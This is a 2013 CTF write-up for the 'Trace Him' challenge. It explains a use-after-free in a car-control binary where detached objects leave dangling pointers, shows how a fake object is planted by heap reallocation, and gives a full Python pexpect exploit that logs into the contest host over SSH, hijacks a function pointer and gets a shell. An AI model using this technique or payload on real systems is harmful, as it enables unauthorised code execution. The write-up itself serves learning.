---
title: '[Secuinside CTF 2013]Trace Him Writeup'
author: suto
layout: post

aktt_notify_twitter:
  - no
shorturls:
  - 'a:0:{}'
tweetbackscheck:
  - 1408358961
kopa_newsmixlight_total_view:
  - 1
category: ctf - clgt crew
tags:
  - CTF
  - used after free
---
*<span style="text-decoration: underline">Description:</span>*

*<span style="text-decoration: underline"> </span>*

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">IP : 59.9.131.155</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">port : 18562 (SSH)</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">account :  control  / control porsche</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">binary : http://war.secuinside.com/files/firmware</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">data : http://war.secuinside.com/files/car.bin</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">(To prevent meaningless waste of time on certain analysis, car.bin is open to public.)</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">hint :</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">root@ubuntu:~# uname -a</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">Linux ubuntu 3.8.0-19-generic #29-Ubuntu SMP Wed Apr 17 18:19:42 UTC 2013 i686 i686 i686 GNU/Linux</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">The evil group is running away by a car who stole personal information of BHBank.</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">The car has feature that you could do like &#8220;remote desktop.&#8221;</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">You can find a vulnerability and stop the car. Get the evil!</span></em>
</div>

> IP : 59.9.131.155
> 
> port : 18562 (SSH)
> 
> account :  control  / control porsche
> 
> binary : http://war.secuinside.com/files/firmware
> 
> data : http://war.secuinside.com/files/car.bin
> 
> (To prevent meaningless waste of time on certain analysis, car.bin is open to public.)
> 
> hint :
> 
> root@ubuntu:~# uname -a
> 
> Linux ubuntu 3.8.0-19-generic #29-Ubuntu SMP Wed Apr 17 18:19:42 UTC 2013 i686 i686 i686 GNU/Linux
> 
> The evil group is running away by a car who stole personal information of BHBank.
> 
> The car has feature that you could do like &#8220;remote desktop.&#8221;
> 
> You can find a vulnerability and stop the car. Get the evil!

When login to with ssh credential provided, we&#8217;ll get a car&#8217;s control interface look like:  
<img class="alignnone" src="http://img441.imageshack.us/img441/9483/74587496.png" alt="" width="457" height="800" />  
Using arrow keys to mov &#8220;O&#8221; around. Now look at the binary we can know how to control this car.  
Go to sub_804B01C function we can see a simple switch/case looks like:

<pre class="brush: cpp; title: ; notranslate" title="">switch ( recvChr )
    {
    case '1':
     ..........
    case '2':
     .........
    case 'A':
     .......
    case 'B':
     .......
    case 'D':
     .......
    case 'C':
     .......
    case ' ':
     .......
    default:
}
</pre>

Using these keys we can playing with feature that interface provided. When navigate the &#8220;O&#8221; to the &#8220;@&#8221; position,press [SPACE] , it will provide 3 options look like:  
<img class="alignnone" src="http://img7.imageshack.us/img7/1090/54551606.png" alt="" width="384" height="800" />  
Let go to the binary and find out how it implemented. Take a look at function sub_0804902B:

<pre class="brush: cpp; title: ; notranslate" title="">obj_1 = (obj_1 *)malloc(52u);
  memset(obj_1, 0, 0x34u);
  obj_1-&gt;indi = '+';
  obj_1-&gt;flag_1 = 12;
  obj_1-&gt;flag_2 = 5;
  obj_1-&gt;flag_3 = 8;
  obj_1-&gt;handle = (int)f_handle;
  obj_1-&gt;window = (int)&obj_1-&gt;case1;
  obj_1-&gt;case1 = (int)case1_1;
  obj_1-&gt;case2 = (int)case1_2;
  obj_1-&gt;case3 = (int)case1_3;
  obj_1-&gt;str1 = (int)&nLockDoor;
  obj_1-&gt;str2 = (int)&unLockDoor;
  obj_1-&gt;str3 = (int)&Detach;
  obj_1-&gt;str4 = (int)&off_804D094;
</pre>

Here I have created a struct for that obj, we can clearly see it creates 5 obj which is corresponding to  5 positions with &#8220;@&#8221;. When navigating the &#8220;O&#8221; to a position with &#8220;@&#8221; and press [SPACE] it will be proceeded in switch/case we have seen above:

<pre class="brush: cpp; title: ; notranslate" title="">case ' ':
        if ( curPos == '@' )
        {
          mvwprintw(v15, 8, 5, "%x %x %x %x", v4, v5);
          wrefresh(v15);
          if ( var_window )
            v4 = var_window-&gt;_cury;&lt;/code&gt;
          else
            v4 = -1;
          if ( var_window )
            v5 = var_window-&gt;_curx;
          else
            v5 = -1;
          do_f_((int)var_window, v15, v9, v4, v5);
          v12 = 1;
        }
        break;
</pre>

Take a look at function do\_f\_:

<pre class="brush: cpp; title: ; notranslate" title="">if ( a3 == '@' )
  {
    for ( i = 0; i &lt;= 5; ++i )
    {
      v8 = *(&gObject_array + i);
      if ( cury - 1 == (char)v8-&gt;flag_1 && (char)v8-&gt;flag_2 == curx )
      {
        indi = (char)v8-&gt;indi;
        break;
      }
    }
</pre>

First the code will loop through 5 objects and check if the object->flag1 and object->flag2 are correct, if matched it will set current object to that address. Something weird here can be abused: if there is memory with correct flag1 and flag2, the code will blindly accept it as an valid object.  
Next part of code is calling the handle function in object with specific parameters:

<pre class="brush: cpp; title: ; notranslate" title="">switch ( indi )
    {
      case '+':
        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&gObject_array + i))-&gt;handle)(
                   (*(&gObject_array + i))-&gt;window,
                   *(&gObject_array + i),
                   a1,
                   a2);
        break;
      case ',':
        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&gObject_array + i))-&gt;handle)(
                   (*(&gObject_array + i))-&gt;window,
                   *(&gObject_array + i),
                   a1,
                   a2);
        break;
      case '-':
        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&gObject_array + i))-&gt;handle)(
                   (*(&gObject_array + i))-&gt;window,
                   *(&gObject_array + i),
                   a1,
                   a2);
        break;
      case '.':
        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&gObject_array + i))-&gt;handle)(
                   (*(&gObject_array + i))-&gt;window,
                   *(&gObject_array + i),
                   a1,
                   a2);
        break;
      case '/':
        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&gObject_array + i))[2].flag_3)(
                   (*(&gObject_array + i))[1].indi,
                   *(&gObject_array + i),
                   a1,
                   a2);
        break;
      default:
        return result;
    }
</pre>

So now the time to go to handle function and see what happen there:

<pre class="brush: cpp; title: ; notranslate" title="">v8 = *(void (__cdecl **)(_DWORD, _DWORD))a2[13];
  v9 = *(void (__cdecl **)(_DWORD, _DWORD))(a2[13] + 4);
  v10 = *(void (__cdecl **)(_DWORD, _DWORD))(a2[13] + 8);
_ch = (char)wgetch(a4);
  switch ( _ch )
  {
    case '2':
      v9(a3, a4);
      break;
    case '3':
      v10(a3, a4);
      break;
    case '1':
      v8(a3, a4);
      break;
    default:
      mvwprintw(a4, 12, 1, "Wrong");
      wrefresh(a4);
      break;
  }
</pre>

v8,v9,v10 is function pointer case1,case2,case3 to handle user&#8217;s choice. Take a quick look at all functions that handle user&#8217;s choice, I found the interesting one is all &#8220;Detach&#8221; functions share the same code that frees the object but not clear the pointer in object_array.  
And another bug introduced in binary was out of bounds read/write. I will let u find that one, it makes me confuse a little bit about attack vector and finally I do something like:

1. Free an object to get a &#8220;dangling pointer&#8221; in object\_array (make sure it is not the last one in object\_array).  
2. Reallocate that pointer with string we can control the content (so we can fool program with fake indi( &#8220;+&#8221;,&#8221;.&#8221;,&#8221;,&#8221;,&#8221;/&#8221; ) and fake flag1,flag2.  
3. Trigger the handle function, when it loops through the object_array it will think our fake object is correct object, then calls the handle function of that object via offset  
4. 41414141 ( Kab00m)

To visualize the exploit steps, here is the object_array during exploitation:  
0x804d380:  
\[Door Object Pointer\]\[Rapair Object Pointer\]\[Front Missle Object Pointer\]\[Rare Object Pointer\][Rear Object Pointer]

*First we Detach Front Missle Object Pointer so it will become:  
0x804d380:  
\[Door Object Pointer\]\[Rapair Object Pointer\]\[Pointer to Freed memory size 0x34\]\[Rare Missle Object Pointer\][Rear Object Pointer]  
<img class="alignnone" src="http://img191.imageshack.us/img191/3107/19012399.png" alt="" width="400" height="800" />  
*Reallocate that memory with Repair Object Comment so it will look like:  
\[Door Object Pointer\]\[Rapair Object Pointer\]\[Pointer to Content ( AAAAAAAAAAA) \]\[Rare Missle Object Pointer\][Rear Object Pointer]  
<img class="alignnone" src="http://img19.imageshack.us/img19/5749/89539837.png" alt="" width="380" height="800" />  
Of course in exploitation we will replace &#8220;AAAA&#8230;&#8221; with string looks like a correct Rare Object.

*Call Rare Missle Object handle function

Finally, exploit code :

<pre class="brush: python; title: ; notranslate" title="">from pexpect import spawn
import time

child = spawn('ssh -p 18562 control@59.9.131.155')
child.expect('password')

child.sendline('control porsche')
#child = spawn("./por")

KEY_UP = 'x1b[A'
KEY_DOWN = 'x1b[B'
KEY_RIGHT = 'x1b[C'
KEY_LEFT = 'x1b[D'

child.expect('Console')

child.send(KEY_RIGHT * 9)
child.send(KEY_DOWN * 2)
child.send(" 3")

child.send(KEY_DOWN)
child.send(KEY_LEFT * 6)
child.send(" 1")
child.sendline("x2dx41x41x41" +"x06x01x01x01" + "x06x01x01x01" + 'AAAAx6bx85x04x08'+"C"*28+"x40x89x04x08")

child.send(" ")

child.sendline("echo 'cat /home/admin/StopTheCar'|./PrivilegeEscalation")

child.interact()
</pre>

Actually, after getting the shell, I got a mini heart attack from organizer since the ReadMe file tells this is 2-steps challenge, it needs another local exploit. My team mate @w00d helped me to retrieve the PrivilegeEscalation binary, and it only does one thing:

<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl sub_804844C()
{
  setreuid(0x3E8u, 0x3E8u);
  return system("/bin/bash");
}
</pre>

It really a nice challenge to work with, thanks organizer for awesome binaries, thank all you guys from CLGT CTF team <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" />  
See u in next CTF.